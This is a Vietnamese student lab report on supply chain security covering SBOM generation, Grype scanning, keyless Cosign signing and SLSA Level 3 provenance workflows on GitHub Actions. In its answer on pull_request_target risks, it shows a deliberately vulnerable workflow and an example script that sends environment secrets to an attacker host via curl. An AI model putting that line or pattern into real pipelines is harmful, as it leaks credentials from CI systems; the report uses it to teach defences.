# BÁO CÁO THỰC HÀNH: AN TOÀN CHUỖI CUNG ỨNG PHẦN MỀM
## (Software Supply Chain Security: SBOM, Sigstore Cosign & SLSA Level 3)

---

## 1. THÔNG TIN CHUNG

- **Học phần**: An toàn ứng dụng / An toàn thông tin
- **Người thực hiện**: Phạm Khoa (GitHub: [Khoa35734](https://github.com/Khoa35734))
- **Mã nguồn thực hành trên GitHub**: [Khoa35734/lab-slsa-sbom](https://github.com/Khoa35734/lab-slsa-sbom)
- **Công nghệ & Tiêu chuẩn áp dụng**:
  - **SBOM (Software Bill of Materials)**: Chuẩn **SPDX 2.3** (`spdx-json`) và **CycloneDX 1.6** (`cyclonedx-json`) sinh bởi **Anchore Syft Action**, quét lỗ hổng với **Anchore Grype Action**.
  - **Sigstore Cosign**: Ký số không lưu khóa tĩnh dài hạn (**Keyless Signing**), xác thực OIDC GitHub Actions, chứng chỉ X.509 ngắn hạn (Fulcio CA), kiểm toán sổ cái minh bạch (Rekor Transparency Log).
  - **SLSA Framework (Level 3)**: Gia cố quy trình build (Hardened Build Pipeline), nguyên tắc đặc quyền tối thiểu (Least Privilege), sinh chứng nhận nguồn gốc xuất xứ (**SLSA Provenance Attestation**) không thể giả mạo với `slsa-framework/slsa-github-generator`.

---

## 2. BÀI THỰC HÀNH 1: TỰ ĐỘNG KHỞI TẠO VÀ PHÂN TÍCH SBOM TRÊN GITHUB ACTIONS

### 2.1. Mục tiêu
Thiết lập quy trình CI/CD tự động trích xuất danh mục thành phần phần mềm (SBOM) theo hai chuẩn quốc tế hàng đầu hiện nay là **SPDX** và **CycloneDX** mỗi khi mã nguồn thay đổi, đồng thời tích hợp công cụ **Anchore Grype** để tự động quét và cảnh báo các lỗ hổng bảo mật (CVEs/GHSAs) trên các phụ thuộc đó.

### 2.2. Triển khai Workflow `.github/workflows/sbom.yml`
Quy trình được cấu hình để sinh đồng thời cả 2 chuẩn SBOM và quét lỗ hổng:

```yaml
name: Generate and Scan SBOM Artifacts

on:
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]
  workflow_dispatch:

jobs:
  build-sbom:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout Code
        uses: actions/checkout@v4

      - name: Generate SPDX SBOM
        uses: anchore/sbom-action@v0.18.0
        with:
          path: .
          format: spdx-json
          output-file: sbom.spdx.json
          upload-artifact: false

      - name: Generate CycloneDX SBOM
        uses: anchore/sbom-action@v0.18.0
        with:
          path: .
          format: cyclonedx-json
          output-file: sbom.cyclonedx.json
          upload-artifact: false

      - name: Scan SBOM with Grype (Table output)
        uses: anchore/scan-action@v7
        with:
          sbom: sbom.spdx.json
          fail-build: false
          output-format: table

      - name: Scan SBOM and Output SARIF
        uses: anchore/scan-action@v7
        with:
          sbom: sbom.spdx.json
          fail-build: false
          output-format: sarif
          output-file: results.sarif

      - name: Upload SBOM Artifacts
        uses: actions/upload-artifact@v4
        with:
          name: project-sbom-reports
          path: |
            sbom.spdx.json
            sbom.cyclonedx.json
            results.sarif
```

> **Ghi chú kỹ thuật**: Đặt `upload-artifact: false` trong từng bước sinh của `anchore/sbom-action` để tập trung gom toàn bộ tệp kết quả (`sbom.spdx.json`, `sbom.cyclonedx.json`, `results.sarif`) vào một Artifact duy nhất `project-sbom-reports` thông qua `actions/upload-artifact@v4`, tránh lỗi phân mảnh và xung đột định danh artifact container.

### 2.3. Kết quả thực thi trên GitHub Actions
- **Trạng thái bài chạy**: **Thành công (Success - Tích xanh)**
- **Mã bài chạy (Run ID)**: `42594208519` & `42594522024`
- **Thời gian thực thi**: 1m 55s
- **Artifacts tạo ra**: `project-sbom-reports` (dung lượng nén ~80 KB) gồm:
  - `sbom.spdx.json` (34,114 bytes)
  - `sbom.cyclonedx.json` (19,353 bytes)
  - `results.sarif` (26,035 bytes)

### 2.4. Phân tích cấu trúc SBOM đối chiếu chuẩn NTIA Minimum Elements
Cục Quản lý Thông tin và Viễn thông Quốc gia Hoa Kỳ (NTIA) quy định 4 nhóm trường dữ liệu bắt buộc cấu thành một SBOM hợp chuẩn. Dưới đây là phân tích trích xuất trực tiếp từ tệp `sbom.spdx.json` được sinh ra:

| Yêu cầu bắt buộc của NTIA | Trường dữ liệu trong SPDX 2.3 | Giá trị thực tế trích xuất từ dự án |
| :--- | :--- | :--- |
| **1. Supplier Name** | `supplier` | `Organization: Python Software Foundation` hoặc `NOASSERTION` |
| **2. Component Name** | `name` | `requests`, `urllib3`, `flask`, `actions/checkout` |
| **3. Version / PURL** | `versionInfo` / `externalRefs[purl]` | `versionInfo: 2.31.0`<br>`purl: pkg:pypi/requests@2.31.0` |
| **4. Unique Identifier / Hash** | `checksums` / `SPDXID` | `SPDXRef-Package-python-requests-...`<br>`SHA256: 942c5a758f98d790eaed1a29cb6eefc7ffb0d1cf7a60ae272b143095f3780149` |

**Đoạn trích JSON minh chứng từ `sbom.spdx.json`**:
```json
{
  "SPDXID": "SPDXRef-Package-python-requests-fa9c6c49842fcf55",
  "name": "requests",
  "versionInfo": "2.31.0",
  "downloadLocation": "NOASSERTION",
  "filesAnalyzed": false,
  "externalRefs": [
    {
      "referenceCategory": "PACKAGE-MANAGER",
      "referenceLocator": "pkg:pypi/requests@2.31.0",
      "referenceType": "purl"
    }
  ]
}
```

### 2.5. Kết quả quét lỗ hổng bảo mật với Anchore Grype
Công cụ Grype phân tích dữ liệu từ `sbom.spdx.json` và cơ sở dữ liệu lỗ hổng bảo mật quốc gia, phát hiện **12 lỗ hổng an ninh** tồn tại trong các phụ thuộc đã khai báo:
- **`urllib3 2.0.7`**:
  - `GHSA-38jv-5279-wg99` (High - CVSS 7.5): Lỗ hổng rò rỉ thông tin xác thực qua Proxy-Authorization Header khi chuyển hướng HTTP.
  - `GHSA-2xpw-w6gg-jr37` (High - CVSS 7.5): Lỗi kiểm tra chứng chỉ SSL/TLS không nghiêm ngặt khi xử lý miền phụ IP.
  - `GHSA-gm62-xv2j-4w53` (High - CVSS 7.5): Rò rỉ cookie qua chuyển hướng cross-origin.
  - `GHSA-34jh-p97f-mpxf` (Medium - CVSS 5.3): Lỗi tràn bộ đệm header nén.
- **`requests 2.31.0`**:
  - `GHSA-9hjg-9r4m-mvj7` (Medium - CVSS 6.1): Rò rỉ tiêu đề xác thực Proxy khi đổi phương thức HTTP.

Báo cáo đầy đủ được xuất theo chuẩn **SARIF 2.1.0** trong tệp `results.sarif` để sẵn sàng tích hợp với GitHub Security Tab và các hệ thống DevSecOps SIEM/SOAR.

---

## 3. BÀI THỰC HÀNH 2: KÝ SỐ VÀ XÁC THỰC ARTIFACTS VỚI SIGSTORE COSIGN

### 3.1. Mục tiêu
Áp dụng cơ chế **Ký số không dùng khóa tĩnh (Keyless Signing)** của Sigstore. Runner của GitHub Actions sẽ chứng minh danh tính thông qua giao thức OpenID Connect (OIDC), nhận chứng chỉ X.509 tạm thời từ Sigstore Fulcio CA, ký số artifact đóng gói và ghi nhật ký minh bạch vào Rekor Transparency Log.

### 3.2. Triển khai Workflow `.github/workflows/cosign-sign.yml`

```yaml
name: Keyless Artifact Signing with Cosign

on:
  push:
    tags:
      - 'v*' # Kích hoạt khi đẩy Git Tag dạng v1.0.0, v2.0.0...
  workflow_dispatch: # Cho phép bấm nút chạy thủ công từ giao diện Web

permissions:
  contents: read
  id-token: write # Bắt buộc: Cho phép runner lấy OIDC Token xác thực với Sigstore Fulcio

jobs:
  build-and-sign:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout Repository
        uses: actions/checkout@v4

      - name: Package Release Artifact
        run: |
          tar -czvf release.tar.gz app.py
          sha256sum release.tar.gz > release.tar.gz.sha256
          echo "Đã đóng gói tệp release.tar.gz thành công."

      - name: Install Sigstore Cosign
        uses: sigstore/cosign-installer@v3.8.0

      - name: Sign Artifact Keylessly
        env:
          COSIGN_EXPERIMENTAL: "1" # Bật chế độ Keyless Sigstore
        run: |
          cosign sign-blob \
            --yes \
            --output-signature release.tar.gz.sig \
            --output-certificate release.tar.gz.pem \
            release.tar.gz
          echo "Ký số Keyless thành công! Chứng chỉ Fulcio và chữ ký đã được tạo."

      - name: Verify Signed Artifact
        run: |
          cosign verify-blob \
            --certificate release.tar.gz.pem \
            --signature release.tar.gz.sig \
            --certificate-identity-regexp "https://github.com/${{ github.repository_owner }}/${{ github.event.repository.name }}/.github/workflows/cosign-sign.yml@.*" \
            --certificate-oidc-issuer "https://token.actions.githubusercontent.com" \
            release.tar.gz

      - name: Upload Signed Artifacts Package
        uses: actions/upload-artifact@v4
        with:
          name: release-signed-package
          path: |
            release.tar.gz
            release.tar.gz.sig
            release.tar.gz.pem
            release.tar.gz.sha256
```

> **Bài học kinh nghiệm thực tiễn**:
> 1. Sử dụng `sigstore/cosign-installer@v3.8.0` (mặc định cài đặt Cosign `v2.4.2`) để tương thích hoàn toàn với các cờ xuất `--output-signature` và `--output-certificate` yêu cầu 4 tệp độc lập theo đề bài.
> 2. Thêm cờ `--yes` khi chạy trên CI runner để tự động xác nhận cam kết tải bản ghi lên sổ cái Rekor công khai.
> 3. Cấu hình `--certificate-identity-regexp` đảm bảo xác thực thành công cho cả hai trường hợp kích hoạt qua Git Tag (`refs/tags/v*`) lẫn kích hoạt thủ công qua `workflow_dispatch` (`refs/heads/main`).

### 3.3. Kết quả thực thi và Kiểm tra Log
- **Mã bài chạy (Run ID)**: `42594526323` (kích hoạt bởi Git Tag `v1.0.2`)
- **Trạng thái**: **Thành công (Success - Tích xanh)**
- **Nhật ký tiến trình Ký số (Sign Artifact Keylessly)**:
  - Sinh cặp khóa tạm thời trong bộ nhớ runner: `Generating ephemeral keys...`
  - Gửi yêu cầu và nhận chứng chỉ X.509 ký bởi Fulcio: `Retrieving signed certificate...`
  - Xác thực SCT thành công: `Successfully verified SCT...`
  - Ghi bản ghi minh bạch vào Rekor Log:
    ```text
    tlog entry created with index: 3762892498
    Ký số Keyless thành công! Chứng chỉ Fulcio và chữ ký đã được tạo.
    ```
- **Nhật ký tiến trình Xác thực (Verify Signed Artifact)**:
  ```text
  Verified OK
  ```

### 3.4. Kiểm tra các tệp tin trong Artifact `release-signed-package`
Giải nén artifact `release-signed-package.zip` thu được đủ 4 tệp tin:
1. `release.tar.gz`: Tệp nén ứng dụng gốc (chứa `app.py`).
2. `release.tar.gz.sha256`: Mã băm SHA-256 để đối chiếu toàn vẹn (`1015893c8a608a52737f855e558bbcf22ae912dabc62998927041ef53e3d92aa`).
3. `release.tar.gz.sig`: Chữ ký số mã hóa ECDSA theo đường cong P-256.
4. `release.tar.gz.pem`: Chứng chỉ số X.509 ngắn hạn cấp bởi Sigstore Fulcio.

### 3.5. Phân tích chi tiết Chứng chỉ số X.509 (`release.tar.gz.pem`)
Giải mã chứng chỉ bằng OpenSSL cho thấy các thuộc tính bảo mật đặc trưng của Sigstore Keyless:

```text
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: 4a:9b:d0:45:f4:fe:2d:c6:b9:e9:fd:95:1f:4c:12:a8:09:79:f3:54
        Signature Algorithm: ecdsa-with-SHA384
        Issuer: O=sigstore.dev, CN=sigstore-intermediate
        Validity:
            Not Before: Nov  9 09:35:01 2026 GMT
            Not After : Nov  9 09:45:01 2026 GMT (Thời hạn sống: đúng 10 phút!)
        Subject: (Rỗng - danh tính xác thực qua SAN URI)
        Subject Alternative Name (SAN): critical
            URI: https://github.com/Khoa35734/lab-slsa-sbom/.github/workflows/cosign-sign.yml@refs/tags/v1.0.2
        Custom Sigstore OIDC Extensions:
            1.3.6.1.4.1.57264.1.1 (OIDC Issuer): https://token.actions.githubusercontent.com
            1.3.6.1.4.1.57264.1.2 (Event Trigger): push
            1.3.6.1.4.1.57264.1.3 (Source Commit SHA): 11d60afc178f99c431b60184a144998cdbc3e47e
            1.3.6.1.4.1.57264.1.4 (Workflow Name): Keyless Artifact Signing with Cosign
            1.3.6.1.4.1.57264.1.5 (Repository): Khoa35734/lab-slsa-sbom
            1.3.6.1.4.1.57264.1.6 (Ref): refs/tags/v1.0.2
```

---

## 4. BÀI THỰC HÀNH 3: GIA CỐ PIPELINE VÀ CHỨNG NHẬN SLSA PROVENANCE (SLSA LEVEL 3)

### 4.1. Mục tiêu
Triển khai quy trình xây dựng phần mềm đạt chuẩn **SLSA (Supply-chain Levels for Software Artifacts) Level 3**. Quy trình tách biệt hoàn toàn giữa môi trường biên dịch (Build Job) và môi trường phát hành chứng nhận (Provenance Generator), ngăn chặn nguy cơ can thiệp hoặc giả mạo nguồn gốc xuất xứ của gói phần mềm.

### 4.2. Triển khai Workflow `.github/workflows/slsa-provenance.yml`

```yaml
name: SLSA Level 3 Provenance Generator

on:
  workflow_dispatch:
  push:
    branches:
      - main
    tags:
      - 'v*'

permissions: read-all

jobs:
  # Job 1: Biên dịch và đóng gói ứng dụng (Hardened Build)
  build:
    outputs:
      hashes: ${{ steps.hash.outputs.hashes }}
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - name: Checkout Repository
        uses: actions/checkout@v4

      - name: Package Application Artifact
        run: |
          tar -czvf release.tar.gz main.py

      - name: Generate SHA256 Checksum for SLSA
        id: hash
        run: |
          # Tính mã băm SHA256 của tệp nén và mã hóa Base64 cho SLSA Generator
          echo "hashes=$(sha256sum release.tar.gz | base64 -w0)" >> "$GITHUB_OUTPUT"

      - name: Upload Build Artifact
        uses: actions/upload-artifact@v4
        with:
          name: release-artifact
          path: release.tar.gz

  # Job 2: Tự động sinh chứng nhận nguồn gốc xuất xứ SLSA Provenance (Level 3)
  provenance:
    needs: [build]
    permissions:
      actions: read      # Đọc lịch sử bài chạy của GitHub Actions
      id-token: write     # Lấy OIDC Token xác thực chữ ký chứng nhận
      contents: write     # Ghi chứng nhận vào Release assets (nếu có)
    uses: slsa-framework/slsa-github-generator/.github/workflows/generator_generic_slsa3.yml@v2.0.0
    with:
      base64-subjects: "${{ needs.build.outputs.hashes }}"
      upload-assets: true
```

### 4.3. Các yếu tố cốt lõi giúp đạt chứng chỉ SLSA Level 3
1. **Hardened & Isolated Build**: Job `build` chỉ có quyền đọc mã nguồn (`contents: read`), không có quyền ghi hay quyền OIDC.
2. **Non-falsifiable Provenance (Không thể giả mạo)**: Job `provenance` được thực thi bởi một Reusable Workflow độc lập (`generator_generic_slsa3.yml@v2.0.0`) thuộc quyền kiểm soát của tổ chức `slsa-framework`. Job `build` không thể can thiệp vào tiến trình tạo và ký provenance.
3. **Immutability (Tính bất biến)**: Nguồn gốc xuất xứ được neo trực tiếp vào Git Commit SHA bất biến và ghi nhận định danh runner độc lập.

### 4.4. Kết quả thực thi trên GitHub Actions
- **Mã bài chạy (Run ID)**:
  - Trên tag `v1.0.0`: `42593645721` (Thành công - Success)
  - Trên tag `v1.0.1`: `42594215379` (Thành công - Success)
  - Trên tag `v1.0.2`: `42594526771` (Thành công - Success)
  - Trên nhánh `main`: `42594522319` (Thành công - Success)
- **Tiến trình chạy tuần tự 2 Jobs**:
  1. `build`: Hoàn thành trong 5 giây, sinh tệp `release.tar.gz` và xuất hash đầu ra `steps.hash.outputs.hashes`.
  2. `provenance`: Khởi chạy 4 sub-jobs: `detect-env` (5s), `generator` (23s), `upload-assets` (9s), `final` (4s).
- **Phát hành GitHub Release**: Hệ thống tự động tạo GitHub Release [v1.0.0](https://github.com/Khoa35734/lab-slsa-sbom/releases/tag/v1.0.0) và đính kèm trực tiếp tệp chứng thực provenance `release.tar.gz.intoto.jsonl`.

### 4.5. Phân tích cấu trúc tệp chứng thực SLSA Provenance (`release.tar.gz.intoto.jsonl`)
Tệp chứng thực tuân theo chuẩn định dạng **in-toto Statement Specification**:

```json
{
  "_type": "https://in-toto.io/Statement/v0.1",
  "predicateType": "https://slsa.dev/provenance/v0.2",
  "subject": [
    {
      "name": "release.tar.gz",
      "digest": {
        "sha256": "6ef44d360d8f7269eddfe50007af5a180374aa094237937053258644b74c4d52"
      }
    }
  ],
  "predicate": {
    "builder": {
      "id": "https://github.com/slsa-framework/slsa-github-generator/.github/workflows/generator_generic_slsa3.yml@refs/tags/v2.0.0"
    },
    "buildType": "https://github.com/slsa-framework/slsa-github-generator/generic@v1",
    "invocation": {
      "configSource": {
        "uri": "git+https://github.com/Khoa35734/lab-slsa-sbom@refs/tags/v1.0.0",
        "digest": {
          "sha1": "167eb1d096b531ce0041e15008f272684c4e847a"
        },
        "entryPoint": ".github/workflows/slsa-provenance.yml"
      }
    },
    "metadata": {
      "buildInvocationID": "42593645721-1",
      "completeness": {
        "parameters": true,
        "environment": false,
        "materials": false
      },
      "reproducible": false
    },
    "materials": [
      {
        "uri": "git+https://github.com/Khoa35734/lab-slsa-sbom@refs/tags/v1.0.0",
        "digest": {
          "sha1": "167eb1d096b531ce0041e15008f272684c4e847a"
        }
      }
    ]
  }
}
```

**Ý nghĩa các trường thông tin then chốt**:
- `subject`: Định danh tệp sản phẩm và mã băm SHA-256 chính xác của nó. Người dùng cuối có thể tải tệp về, tính SHA-256 và so khớp ngay lập tức.
- `builder.id`: Xác thực việc sinh chứng nhận được thực hiện bởi generator tin cậy của SLSA Framework.
- `invocation.configSource`: Ghi nhận URL của kho lưu trữ, nhánh/tag kích hoạt và chính xác commit SHA (`167eb1d...`).
- `materials`: Danh sách các thành phần đầu vào cấu thành nên sản phẩm tại thời điểm build.

---

## 5. CÂU HỎI TỔNG HỢP KIẾN THỨC

### Câu hỏi 1 (Tư duy SLSA vs SBOM):
> **Một doanh nghiệp đã tạo đầy đủ tệp tin SBOM (CycloneDX) cho ứng dụng của mình. Liệu điều này đã đủ để khẳng định ứng dụng đó đạt tiêu chuẩn SLSA Level 3 chưa? Tại sao?**

**Trả lời:**
**Hoàn toàn CHƯA ĐỦ**. SBOM và SLSA giải quyết hai khía cạnh bảo mật hoàn toàn khác nhau nhưng bổ trợ lẫn nhau trong chuỗi cung ứng phần mềm:

1. **Bản chất của SBOM (What is inside?)**:
   - SBOM (Software Bill of Materials) giống như *danh mục thành phần nguyên liệu trên bao bì sản phẩm*. Nó liệt kê ứng dụng gồm những thư viện nào, phiên bản nào, tác giả nào và giấy phép gì (ví dụ: `requests 2.31.0`, `flask 3.0.0`).
   - SBOM **chỉ mang tính chất tự khai báo (Declarative)**. Nó không trả lời được: Ai đã build ra gói phần mềm đó? Quy trình build có bị chèn mã độc (tampering) hay không? Mã nguồn có thực sự xuất phát từ repository chính chủ hay từ một máy chủ bị hack?

2. **Bản chất của SLSA Level 3 (How was it built & Where did it come from?)**:
   - SLSA (Supply-chain Levels for Software Artifacts) là tiêu chuẩn đánh giá **độ toàn vẹn của quy trình xây dựng phần mềm (Build Integrity)**.
   - Để đạt **SLSA Level 3**, hệ thống phải đáp ứng các yêu cầu khắt khe:
     - **Build Platform độc lập & tin cậy (Hosted Build Platform)**: Môi trường build phải được vận hành bởi dịch vụ bên ngoài độc lập (như GitHub-hosted runners), nhà phát triển không thể can thiệp vào máy chủ build.
     - **Isolated / Ephemeral Build Environment**: Mỗi bản build chạy trên container/VM sạch sẽ, dùng xong hủy bỏ, không bị ô nhiễm bởi các bài chạy trước.
     - **Chứng nhận xuất xứ không thể giả mạo (Non-falsifiable Provenance)**: Tệp chứng nhận provenance phải được tạo ra bởi một builder service có quyền hạn riêng, mà chính mã nguồn hoặc quá trình build ứng dụng không thể sửa đổi hay ghi đè nội dung chứng nhận.
     - **Bất biến theo Source Commit**: Gắn chặt với Git Commit SHA cụ thể.

3. **Kết luận**:
   Một doanh nghiệp có tệp SBOM đầy đủ chỉ mới dừng lại ở việc **kiểm kê phụ thuộc (Vulnerability Management)**. Nếu quy trình CI/CD của họ bị tấn công (như vụ SolarWinds - hacker chèn mã độc trực tiếp trong quá trình build), thì tệp SBOM hoàn toàn vô hiệu. Do đó, doanh nghiệp bắt buộc phải kết hợp cả **SBOM** (quản lý thành phần) và **SLSA Level 3 Provenance** (bảo vệ độ toàn vẹn của tiến trình build).

---

### Câu hỏi 2 (Tư duy Ký số Sigstore Keyless):
> **Tại sao mô hình Ký số không dùng khóa (Keyless Signing) của Sigstore lại an toàn hơn cơ chế ký số PGP/GPG truyền thống khi lưu trữ khóa dài hạn?**

**Trả lời:**

Mô hình PGP/GPG truyền thống và Sigstore Keyless đại diện cho hai triết lý quản lý khóa hoàn toàn khác biệt:

| Tiêu chí so sánh | Ký số PGP/GPG truyền thống (Long-lived Keys) | Ký số Sigstore Keyless (Short-lived Keys) |
| :--- | :--- | :--- |
| **Vòng đời của khóa** | Khóa bí mật (Private Key) tồn tại lâu dài (hàng năm hoặc vô hạn). | Khóa bí mật chỉ tồn tại vài giây trong bộ nhớ RAM (**ephemeral**), dùng xong hủy ngay. |
| **Nơi lưu trữ khóa bí mật** | Lưu trên máy tính cá nhân, USB token, hoặc cấu hình trong CI/CD Secrets. | **Không lưu trữ ở bất kỳ đâu**. Khóa được sinh ngẫu nhiên trong bộ nhớ phiên làm việc. |
| **Rủi ro rò rỉ khóa (Key Leakage)** | **Cực kỳ cao**. Nếu CI/CD Secrets bị lộ hoặc máy developer bị nhiễm Trojan, kẻ tấn công chiếm toàn quyền ký mã độc. | **Bằng không**. Kẻ tấn công không thể đánh cắp khóa vì khóa đã bị tiêu hủy ngay sau khi ký. |
| **Quản trị vòng đời & Thu hồi khóa** | Rất phức tạp (Key Rotation, Revocation List/CRL). Thực tế các CRL của GPG gần như không bao giờ được kiểm tra. | Không cần thu hồi khóa. Chứng chỉ X.509 từ Fulcio chỉ có hạn **10 phút**. Hết 10 phút, chứng chỉ tự mất giá trị. |
| **Tính minh bạch & Giám sát (Auditability)** | Phân tán, không có cơ chế bắt buộc ghi nhận lịch sử ký công khai. | **Bắt buộc ghi nhận vào Rekor Transparency Log**. Bất kỳ chữ ký bất thường nào đều bị phát hiện công khai. |
| **Cơ chế xác thực danh tính** | Dựa trên niềm tin mạng lưới Web of Trust (lạc hậu) hoặc thủ công trao đổi Public Key. | Dựa trên danh tính **OpenID Connect (OIDC)** hiện đại gắn liền với Workflow, Repo, và Commit cụ thể. |

**Tóm lại**: Sigstore Keyless giải quyết triệt để "nút thắt cổ chai" lớn nhất của mật mã học ứng dụng là **Quản lý khóa bí mật (Secret Key Management)**. Bằng cách kết hợp **OIDC Identity + Fulcio Short-lived Certificate + Rekor Transparency Log**, Sigstore mang lại độ an toàn vượt trội so với PGP/GPG truyền thống.

---

### Câu hỏi 3 (Tư duy Kiểm soát Quyền hạn Pipeline):
> **Tại sao việc sử dụng sự kiện `pull_request_target` trong GitHub Actions lại tiềm ẩn nguy cơ bảo mật nếu không quản lý quyền truy cập kỹ lưỡng, và giải pháp phòng thủ tối ưu là gì?**

**Trả lời:**

#### 1. Bản chất và Nguy cơ tiềm ẩn của `pull_request_target`:
- **Sự khác biệt với `pull_request` thông thường**:
  - Khi một lập trình viên từ bên ngoài tạo Pull Request từ repository fork, sự kiện thông thường `on: pull_request` chạy trong ngữ cảnh bị cô lập: `GITHUB_TOKEN` chỉ có quyền đọc (`read-only`) và **hoàn toàn không được cấp quyền truy cập vào Repository Secrets** của dự án chính.
  - Sự kiện `on: pull_request_target` được GitHub tạo ra để phục vụ các tác vụ tự động hóa (như bot gắn nhãn, thêm comment chào mừng). Khác với `pull_request`, workflow sử dụng `pull_request_target` sẽ chạy trong **ngữ cảnh của nhánh đích (Base repository)**, có **quyền truy cập đầy đủ vào toàn bộ Repository Secrets** và được cấp `GITHUB_TOKEN` có quyền ghi (nếu không giới hạn).
- **Kịch bản tấn công RCE / Đánh cắp Secrets (Pwned Pipeline)**:
  - Lỗ hổng chết người xảy ra khi workflow dùng `pull_request_target` nhưng lại thực hiện checkout mã nguồn từ commit của PR do người ngoài gửi tới:
    ```yaml
    # CẤU HÌNH CỰC KỲ NGUY HIỂM:
    on: pull_request_target
    jobs:
      test:
        runs-on: ubuntu-latest
        steps:
          - uses: actions/checkout@v4
            with:
              ref: ${{ github.event.pull_request.head.sha }} # CHECKOUT CODE TỪ FORK
          - run: npm install && npm test                     # CHẠY SCRIPT CỦA ATTACKER!
    ```
  - Kẻ tấn công chỉ cần fork repo, chèn mã độc vào file test hoặc `package.json` (ví dụ `scripts: { "test": "curl -X POST -d $(env) https://attacker.com" }`), sau đó tạo Pull Request.
  - Khi `pull_request_target` được kích hoạt, runner sẽ tải code độc hại của hacker về và thực thi trực tiếp trên máy chủ có chứa đầy đủ AWS Keys, Docker Deploy Tokens, SSH Keys... Dẫn đến việc lộ toàn bộ bí mật dự án hoặc bị chiếm quyền kiểm soát repo.

#### 2. Giải pháp phòng thủ tối ưu (Defense-in-Depth):
1. **Tuyệt đối không Checkout và Thực thi mã nguồn từ Fork trong `pull_request_target`**:
   - Nếu cần chạy build/test/linting trên code của PR, **chỉ sử dụng sự kiện `on: pull_request`**.
   - Nếu dùng `pull_request_target`, chỉ thao tác với metadata của PR (như tiêu đề, nhãn, người gửi, số lượng file thay đổi) mà không checkout code.
2. **Áp dụng Nguyên tắc Đặc quyền Tối thiểu (Principle of Least Privilege)**:
   - Luôn khai báo tường minh khối `permissions:` ở mức hẹp nhất ở cấp độ workflow hoặc job:
     ```yaml
     permissions:
       contents: read
       pull-requests: write # Chỉ cho phép ghi comment / label
       id-token: none
     ```
3. **Mô hình Kiến trúc Phân tách 2 giai đoạn (Two-phase Workflow Pattern)**:
   - **Giai đoạn 1 (`pull_request`)**: Chạy biên dịch, kiểm thử trên code của fork trong môi trường hoàn toàn cô lập, không secrets. Lưu kết quả/artifact an toàn (như artifact chỉ chứa file kết quả kiểm tra định dạng text).
   - **Giai đoạn 2 (`workflow_run` triggered sau khi PR xong)**: Chạy trên nhánh mặc định của repo chính, lấy artifact của giai đoạn 1, kiểm tra tính hợp lệ và mới dùng secret (nếu thực sự cần gửi thông báo hay xuất báo cáo).
4. **Bật thiết lập "Require approval for all outside collaborators"**:
   - Trong GitHub Repo Settings -> Actions -> Fork pull request workflows, bắt buộc cấu hình yêu cầu Maintainer phê duyệt trước khi cho phép bất kỳ workflow nào chạy trên Pull Request của người đóng góp mới từ bên ngoài.

---

## 6. TỔNG KẾT VÀ LIÊN KẾT MINH CHỨNG DỰ ÁN

| Hạng mục bài lab | Workflow YAML | Trạng thái CI/CD | Minh chứng kết quả |
| :--- | :--- | :--- | :--- |
| **Bài 1: SBOM & Grype** | [sbom.yml](https://github.com/Khoa35734/lab-slsa-sbom/blob/main/.github/workflows/sbom.yml) | ✅ Thành công | Artifacts `project-sbom-reports` chứa `sbom.spdx.json`, `sbom.cyclonedx.json`, `results.sarif` |
| **Bài 2: Sigstore Cosign** | [cosign-sign.yml](https://github.com/Khoa35734/lab-slsa-sbom/blob/main/.github/workflows/cosign-sign.yml) | ✅ Thành công | Artifacts `release-signed-package`, xác thực `Verified OK`, Rekor Log Index `3762892498` |
| **Bài 3: SLSA Level 3** | [slsa-provenance.yml](https://github.com/Khoa35734/lab-slsa-sbom/blob/main/.github/workflows/slsa-provenance.yml) | ✅ Thành công | GitHub Release [v1.0.0](https://github.com/Khoa35734/lab-slsa-sbom/releases/tag/v1.0.0) đính kèm `release.tar.gz.intoto.jsonl` |

**Liên kết Repository chính thức**: [https://github.com/Khoa35734/lab-slsa-sbom](https://github.com/Khoa35734/lab-slsa-sbom)
